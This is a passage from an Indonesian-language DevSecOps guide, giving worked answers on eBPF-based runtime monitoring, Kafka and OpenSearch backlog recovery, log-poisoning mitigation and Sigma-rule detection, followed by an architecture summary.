8. **Mitigasi Log Poisoning**: Menerapkan skema parsing ketat berbasis *strict JSON/Protobuf codec*, validasi tipe data (type-casting), melakukan isolasi escape character pada newline injection (`\n`, `\r`), dan memvalidasi ukuran field string maksimum.
9. **`execve` vs `execveat`**: `execve` mengeksekusi binari via file path langsung. `execveat` dapat mengeksekusi binari langsung dari *directory file descriptor* (sering dipakai teknik *living-off-the-land* untuk menghindari deteksi path-based tradisional). Keduanya harus dipantau untuk mencegah bypass pengawasan proses.
10. **Trade-off ZSTD vs GZIP**: ZSTD memiliki rasio kompresi setara atau lebih unggul dibanding GZIP level tinggi, namun dengan kecepatan dekompresi jauh lebih konstan dan konsumsi CPU indexing hingga 3-5x lebih efisien dibanding GZIP pada beban data telemetri stream.

#### Solusi Skenario Kasus Produksi
11. **Solusi Skenario 1**:
    - *Akar Masalah*: Kemungkinan besar terjadi kejenuhan pada alokasi *BPF Ring Buffer pages* atau socket buffer queue (`net.core.rmem_max`/`net.core.wmem_max`), bukan kehabisan CPU. Pada beban ML intensif, syscall interupsi hardware GPU/PCIe dan networking berkecepatan tinggi dapat membanjiri ring buffer kecil, menyebabkan buffer overflow di kernel space sebelum Vector userspace sempat membaca data.
    - *Remediasi*: Periksa metrik BPF drop counter via `bpftool prog show`. Tingkatkan alokasi alokasi `ring_buffer.pages` agen, dan berikan prioritas CPU isolation menggunakan *pinned CPU cores* atau *real-time priority* (`chrt`) pada worker agen keamanan.
12. **Solusi Skenario 2**:
    - *Identifikasi*:
      1. Cek metrik Kafka Consumer Group Lag (`kafka-consumer-groups.sh --describe`). Jika lag terus bertambah, bottleneck ada di consumer/indexer layer, bukan di broker.
      2. Periksa OpenSearch thread pool status via API: `GET /_cat/thread_pool/write?v`. Perhatikan apakah kolom `rejected` atau `queue` bernilai tinggi.
    - *Pemulihan*:
      - Tingkatkan batch size dan delay flush pada Vector/aggregator (misal: batch events dinaikkan ke 5.000 atau ukuran 5MB) untuk mengurangi frekuensi disk commit pada OpenSearch.
      - Skalakan jumlah partisi Kafka dan tambahkan replika pod Vector Aggregator consumer agar sejajar dengan partisi (1-to-1 consumer thread per partition).
      - Set `refresh_interval` index OpenSearch sementara ke `30s` atau `60s` selama pemulihan lag untuk mempercepat indexing throughput.
13. **Solusi Skenario 3**:
    - *Mekanisme eBPF LSM Hooks*: Agen seperti Tetragon mengaitkan program eBPF langsung ke hook kernel `security_file_open` atau `security_inode_unlink`.
    - *Pencegahan Instan*: Saat ada proses container yang memanggil instruksi penghapusan atau penulisan ulang file biner di direktori read-only sistem (`/bin`), eBPF LSM dapat mengembalikan nilai return `-EACCES` atau `-EPERM` langsung di kernel level.
    - Operasi syscall penyerang langsung digagalkan seketika (*fail-closed enforcement*) tanpa bergantung pada daemon userspace, dan event pelanggaran dikirim secara asinkron ke SIEM via Ring Buffer.

---

### 16. Summary

Observabilitas keamanan modern untuk enterprise DevSecOps bergeser dari model *reactive host log analysis* menuju arsitektur *proactive kernel-driven runtime observability*. Inti arsitektur produksi bertumpu pada fondasi berikut:
1. **Data Acquisition (eBPF)**: Pemanfaatan *LSM Hooks* dan *BPF Ring Buffer* menyediakan visibilitas tingkat kernel terdalam (proses, jaringan, file) tanpa fragmentasi performa dan tamper-proof dari manipulasi userspace.
2. **Standardization & Enrichment**: Pengadopsian skema universal (ECS/OCSF) dan pengayaan metadata Kubernetes lokal secara real-time mengeliminasi jurang isolasi context antara log sistem mentah dan pod kontainer cloud.
3. **Decoupled Architecture**: Apache Kafka berfungsi sebagai pelindung mutlak (*backpressure shield*) yang menjamin *zero data loss* saat beban infrastruktur melonjak atau cluster analitik SIEM mengalami gangguan.
4. **Declarative Detection**: Sigma Rules memisahkan logika perburuan ancaman dari sintaks platform SIEM, memastikan aturan deteksi dapat dikelola, diuji, dan diterapkan otomatis melalui pipeline CI/CD layaknya kode perangkat lunak (*Detection-as-Code*).